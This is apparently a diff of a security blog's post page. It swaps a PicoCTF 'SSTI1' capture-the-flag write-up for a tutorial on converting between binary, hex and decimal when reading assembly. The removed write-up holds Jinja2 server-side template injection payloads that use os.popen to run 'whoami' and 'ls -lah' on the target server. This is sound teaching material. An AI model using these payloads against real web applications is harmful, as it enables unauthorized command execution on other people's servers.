@@ -3,7 +3,7 @@
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1" />
-    <title>SSTI1 (PicoCTF)</title>
+    <title>Mastering BHC</title>
 
     <!-- Toast UI Editor CSS -->
     <link rel="stylesheet" href="https://uicdn.toast.com/editor/latest/toastui-editor.min.css" />
@@ -99,10 +99,10 @@
       <div class="post-page">
   <article class="post-container px-4 py-5 mx-auto max-w-4xl text-gray-100">
     <header class="mb-4 border-b border-gray-600 pb-3">
-      <h1 class="text-3xl font-bold text-white">SSTI1 (PicoCTF)</h1>
+      <h1 class="text-3xl font-bold text-white">Mastering BHC</h1>
       
       <p class="text-sm text-gray-400">
-        May 31, 2025
+        June 13, 2025
       </p>
       
       <p class="text-sm text-gray-400">
@@ -118,11 +118,11 @@
         <p class="mt-1 text-sm text-gray-400">
           Tags: 
           
-            <a href="/tags/red team" class="text-gray-400 hover:text-white">red team</a>, 
+            <a href="/tags/Redteam" class="text-gray-400 hover:text-white">Redteam</a>, 
           
             <a href="/tags/pentesting" class="text-gray-400 hover:text-white">pentesting</a>, 
           
-            <a href="/tags/bug bounty" class="text-gray-400 hover:text-white">bug bounty</a>, 
+            <a href="/tags/bugbounty" class="text-gray-400 hover:text-white">bugbounty</a>, 
           
             <a href="/tags/ctf" class="text-gray-400 hover:text-white">ctf</a>
           
@@ -131,55 +131,144 @@
     </header>
 
     <section class="post-content prose prose-invert max-w-none text-gray-300">
-      <p><img src="http://art.vx-underground.org/art/pancak3_an_image_of_a_computer_hacker_in_the_style_of_pixelated_c429d5b3-77c4-4c70-9076-a2c3e7ff6f3a.png" alt="Set up Listener" width="400" style="     display: block;     margin: 50px auto 40px;     border-radius: 18px;     border: 2.5px solid #111; /* crisp black border */     box-shadow: 0 10px 25px rgba(0, 0, 0, 0.12); /* soft black shadow */     transition: transform 0.3s ease, box-shadow 0.3s ease;     cursor: pointer;   " onmouseover="this.style.transform='scale(1.05)'; this.style.boxShadow='0 15px 35px rgba(0, 0, 0, 0.25)';" onmouseout="this.style.transform='scale(1)'; this.style.boxShadow='0 10px 25px rgba(0, 0, 0, 0.12)';" /></p>
+      <h1 id="mastering-binary-hexadecimal-and-decimal-conversion-a-hackers-edge-in-reading-assembly">Mastering Binary, Hexadecimal, and Decimal Conversion: A Hacker’s Edge in Reading Assembly</h1>
 
-<h2 id="description">Description</h2>
+<p>In the trenches of reverse engineering and assembly analysis, <strong>speed and precision</strong> in converting between number systems can be the difference between success and getting blind-sided.</p>
 
-<blockquote>I made a cool website where you can announce whatever you want! Try it out! I heard templating is a cool and modular way to build web apps!</blockquote>
+<p>Assembly language is the low-level lingua franca of the machine raw instructions, registers, memory addresses, and opcodes often present themselves in <strong>binary</strong>, <strong>hexadecimal (hex)</strong>, or <strong>decimal</strong> formats. Each plays a unique role, and being fluent in all three lets you decode the machine’s language like a ghost in the system.</p>
 
-<p><img src="https://miro.medium.com/v2/resize:fit:613/1*749ohjzhVKocSttt49oQWQ.png" alt="" /></p>
+<hr />
 
-<p>If we type picoCTF, it would show this:</p>
+<h2 id="why-conversion-skills-matter">Why Conversion Skills Matter</h2>
 
-<p><img src="https://miro.medium.com/v2/resize:fit:700/1*We7v-m3zd-UQpEYLKxGCFA.png" alt="" /></p>
+<h3 id="1-binary-the-raw-machine-code">1. <strong>Binary: The Raw Machine Code</strong></h3>
 
-<p>Let’s try some template injection, in this case we are going to use this <code class="language-plaintext highlighter-rouge">{{7*7}}</code>:</p>
+<p>At the lowest level, everything the CPU processes boils down to binary strings of 0s and 1s. These bits directly represent instructions, flags, memory addresses, and data.</p>
 
-<p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection?source=post_page-----0853498698d5---------------------------------------">PayloadsAllTheThings/Server Side Template Injection</a></p>
+<ul>
+  <li><strong>Pro:</strong> Binary reveals exact bit patterns and flags.</li>
+  <li><strong>Con:</strong> It’s bulky and hard to read manually, especially over multiple bytes.</li>
+</ul>
 
-<p><img src="https://miro.medium.com/v2/resize:fit:700/1*p6nuwKmCpJDW8EQ2qJtakA.png" alt="" /></p>
+<h3 id="2-hexadecimal-the-human-friendly-binary">2. <strong>Hexadecimal: The Human-Friendly Binary</strong></h3>
 
-<p>This time, we got <code class="language-plaintext highlighter-rouge">49</code> because <code class="language-plaintext highlighter-rouge">7 × 7 = 49</code>. That means our injection works. Now, let’s try some more advanced injections.</p>
+<p>Hex condenses every 4 bits into a single character (0–F), making binary far easier to read and manage.</p>
 
-<div class="code-block-container">
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  
-  <pre><code class="language-powershell">{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('whoami').read() }}</code></pre>
-  
-</div>
+<ul>
+  <li><strong>Pro:</strong> Hex is compact and widely used in disassembly, debugging, and memory dumps.</li>
+  <li><strong>Pro:</strong> Aligns perfectly with byte boundaries each pair of hex digits = 1 byte = 8 bits.</li>
+  <li><strong>Con:</strong> Requires fluency in quick hex ↔ binary conversions for bit-level analysis.</li>
+</ul>
 
-<p><img src="https://miro.medium.com/v2/resize:fit:700/1*nIEgY-qk-0gDP50LEfcLdQ.png" alt="" /></p>
+<h3 id="3-decimal-intuitive-values">3. <strong>Decimal: Intuitive Values</strong></h3>
 
-<div class="code-block-container">
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  
-  <pre><code class="language-powershell">{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('ls -lah').read() }}</code></pre>
-  
-</div>
+<p>Decimal is natural for humans representing counts, offsets, and numeric constants. Assembly often references values in decimal for easier understanding.</p>
 
-<p><img src="https://miro.medium.com/v2/resize:fit:700/1*ppTGzKKyJ-A80GgxnjNRNg.png" alt="" /></p>
+<ul>
+  <li><strong>Pro:</strong> Easy to interpret at a glance.</li>
+  <li><strong>Con:</strong> Does not map cleanly to binary or memory layout, so conversions are often needed.</li>
+</ul>
 
-<p>Now we can read the flag.</p>
+<hr />
+
+<h2 id="practical-scenarios-conversion-in-action">Practical Scenarios: Conversion in Action</h2>
+
+<ul>
+  <li><strong>Reading opcodes:</strong> Opcodes are typically represented in hex. To understand instruction flags or modes, you must convert hex opcodes to binary and analyze bit patterns.</li>
+  <li><strong>Memory addressing:</strong> Addresses are often in hex, but offsets or lengths might be decimal. Being able to switch quickly helps you navigate memory layouts.</li>
+  <li><strong>Flag manipulation:</strong> Bitwise flags in registers or status words need binary understanding. You may see hex values but must interpret which bits are set.</li>
+  <li><strong>Shellcode crafting and debugging:</strong> Hex byte sequences represent shellcode; converting to binary reveals the actual instruction bits for modification or analysis.</li>
+</ul>
+
+<hr />
+
+<h2 id="conversion-cheat-sheet-hex--binary">Conversion Cheat Sheet: Hex ↔ Binary</h2>
+
+<table>
+  <thead>
+    <tr>
+      <th>Hex</th>
+      <th>Binary</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>0</td>
+      <td>0000</td>
+    </tr>
+    <tr>
+      <td>1</td>
+      <td>0001</td>
+    </tr>
+    <tr>
+      <td>2</td>
+      <td>0010</td>
+    </tr>
+    <tr>
+      <td>3</td>
+      <td>0011</td>
+    </tr>
+    <tr>
+      <td>4</td>
+      <td>0100</td>
+    </tr>
+    <tr>
+      <td>5</td>
+      <td>0101</td>
+    </tr>
+    <tr>
+      <td>6</td>
+      <td>0110</td>
+    </tr>
+    <tr>
+      <td>7</td>
+      <td>0111</td>
+    </tr>
+    <tr>
+      <td>8</td>
+      <td>1000</td>
+    </tr>
+    <tr>
+      <td>9</td>
+      <td>1001</td>
+    </tr>
+    <tr>
+      <td>A</td>
+      <td>1010</td>
+    </tr>
+    <tr>
+      <td>B</td>
+      <td>1011</td>
+    </tr>
+    <tr>
+      <td>C</td>
+      <td>1100</td>
+    </tr>
+    <tr>
+      <td>D</td>
+      <td>1101</td>
+    </tr>
+    <tr>
+      <td>E</td>
+      <td>1110</td>
+    </tr>
+    <tr>
+      <td>F</td>
+      <td>1111</td>
+    </tr>
+  </tbody>
+</table>
+
+<hr />
+
+<h2 id="tips-for-speed-and-accuracy">Tips for Speed and Accuracy</h2>
+
+<ul>
+  <li>Always pad binary to 4-bit groups when converting to/from hex.</li>
+  <li>Group bits in bytes (8 bits) for reading memory or instructions.</li>
+  <li>Use hex when reading dumps, binary for bitwise flag analysis, and decimal for intuitive values.</li>
+  <li>Practice quick mental conversions and develop muscle memory with common hex values (e.g., <code class="language-plaintext highlighter-rouge">0xFF</code>, <code class="language-plaintext highlighter-rouge">0x7F</code>, <code class="language-plaintext highlighter-rouge">0xC3</code>).</li>
+</ul>
 
     </section>
 
